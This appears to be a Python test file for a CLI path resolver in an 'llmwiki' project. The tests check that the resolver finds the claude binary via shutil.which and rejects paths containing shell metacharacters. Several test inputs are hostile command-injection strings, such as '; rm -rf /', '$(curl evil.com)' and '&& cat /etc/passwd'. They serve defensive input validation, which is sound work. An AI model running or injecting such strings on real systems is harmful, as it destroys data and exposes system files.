"""Tests for the claude-CLI path resolver hardening (closes #421).

The synthesize-overview path used to default to a hard-coded
`/usr/local/bin/claude` and shell out without sanitisation. Both
were security hygiene concerns:

1. Hard-coded `/usr/local/bin/claude` doesn't exist on Linux package
   installs, NixOS, Windows, or anywhere claude lives behind asdf /
   nvm / pyenv / brew. Users had to pass `--claude` explicitly even
   though `shutil.which("claude")` would Just Work.
2. `--claude` accepted any string. The path is rendered into argv (so
   no shell interpretation), but it ALSO ends up in user-facing logs
   and could end up interpolated by future code paths. Reject paths
   with shell metacharacters loudly so the hygiene gap doesn't widen.

These tests pin both behaviours.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch


def test_claude_path_resolves_via_shutil_which_when_empty(tmp_path: Path):
    """No --claude flag → use `shutil.which("claude")` to find it."""
    from llmwiki.build import _resolve_claude_path

    fake_claude = tmp_path / "claude"
    fake_claude.write_text("#!/bin/sh\necho fake\n", encoding="utf-8")
    fake_claude.chmod(0o755)

    with patch("shutil.which", return_value=str(fake_claude)):
        resolved = _resolve_claude_path("")
    assert resolved == fake_claude


def test_claude_path_returns_none_when_not_on_path():
    """No --claude flag and `claude` not on PATH → None (skip synth)."""
    from llmwiki.build import _resolve_claude_path

    with patch("shutil.which", return_value=None):
        assert _resolve_claude_path("") is None
    with patch("shutil.which", return_value=None):
        assert _resolve_claude_path(None) is None


def test_claude_path_explicit_valid_path_accepted(tmp_path: Path):
    """`--claude /path/to/claude` works when the file exists."""
    from llmwiki.build import _resolve_claude_path

    fake_claude = tmp_path / "claude"
    fake_claude.write_text("#!/bin/sh\n", encoding="utf-8")
    resolved = _resolve_claude_path(str(fake_claude))
    assert resolved == fake_claude


def test_claude_path_nonexistent_file_returns_none(tmp_path: Path, capsys):
    """`--claude /path/that/does/not/exist` → warning + None."""
    from llmwiki.build import _resolve_claude_path

    missing = tmp_path / "does-not-exist"
    assert _resolve_claude_path(str(missing)) is None
    err = capsys.readouterr().err
    assert "claude CLI not found" in err


def test_claude_path_rejects_semicolon(capsys):
    """`--claude "rm -rf /"` style → rejected with clear warning."""
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("/usr/bin/claude; rm -rf /") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_dollar_substitution(capsys):
    """`$(curl evil.com)` style → rejected."""
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("$(curl evil.com)") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_backticks(capsys):
    """Backtick subshell → rejected."""
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("`whoami`") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_pipe(capsys):
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("/usr/bin/claude | tee /tmp/x") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_ampersand(capsys):
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("/usr/bin/claude && cat /etc/passwd") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_newline(capsys):
    """Embedded newline (CRLF or LF) → rejected so log lines stay
    parseable + nothing sneaks past argv splitting."""
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("/usr/bin/claude\nrm -rf /") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_rejects_redirect_chars(capsys):
    """`<` and `>` (output redirect) → rejected."""
    from llmwiki.build import _resolve_claude_path

    assert _resolve_claude_path("/usr/bin/claude > /tmp/y") is None
    err = capsys.readouterr().err
    assert "shell metacharacters" in err


def test_claude_path_accepts_valid_unix_path(tmp_path: Path):
    """Plain old `/usr/local/bin/claude` (or our test fixture) works."""
    from llmwiki.build import _resolve_claude_path

    fake_claude = tmp_path / "claude"
    fake_claude.write_text("#!/bin/sh\n", encoding="utf-8")
    assert _resolve_claude_path(str(fake_claude)) == fake_claude


def test_claude_path_accepts_path_with_spaces(tmp_path: Path):
    """Paths with spaces (common on macOS/Windows) work."""
    from llmwiki.build import _resolve_claude_path

    spaced_dir = tmp_path / "Application Support"
    spaced_dir.mkdir()
    fake_claude = spaced_dir / "claude"
    fake_claude.write_text("#!/bin/sh\n", encoding="utf-8")
    resolved = _resolve_claude_path(str(fake_claude))
    assert resolved == fake_claude


def test_claude_path_accepts_windows_style(tmp_path: Path):
    """Windows-style paths (`C:\\Program Files\\claude\\claude.exe`)
    don't contain shell metacharacters and are accepted as long as
    the file exists."""
    from llmwiki.build import _resolve_claude_path

    fake = tmp_path / "claude.exe"
    fake.write_text("", encoding="utf-8")
    assert _resolve_claude_path(str(fake)) == fake


def test_synthesize_overview_returns_none_on_bad_path(capsys):
    """Top-level synthesize_overview wraps the resolver — a hostile
    path returns None and warns instead of executing anything."""
    from llmwiki.build import synthesize_overview

    result = synthesize_overview({}, claude_path="/usr/bin/claude; rm -rf /")
    assert result is None


def test_synthesize_overview_returns_none_when_not_on_path(monkeypatch, capsys):
    """No claude binary on PATH and no --claude flag → None, no crash."""
    from llmwiki.build import synthesize_overview

    monkeypatch.setattr("shutil.which", lambda _name: None)
    assert synthesize_overview({}, claude_path="") is None


def test_cli_build_default_claude_is_empty_string():
    """The CLI default for --claude is now empty string (#421);
    `_resolve_claude_path` then falls back to shutil.which."""
    from llmwiki.cli import build_parser

    parser = build_parser()
    args = parser.parse_args(["build"])
    # We just need the empty-string default; exact value doesn't matter,
    # only that it isn't a hardcoded /usr/local/bin/claude.
    assert getattr(args, "claude", None) == ""


def test_cli_build_explicit_claude_path_passes_through():
    """User-provided --claude path round-trips."""
    from llmwiki.cli import build_parser

    parser = build_parser()
    args = parser.parse_args(["build", "--claude", "/opt/claude/bin/claude"])
    assert args.claude == "/opt/claude/bin/claude"
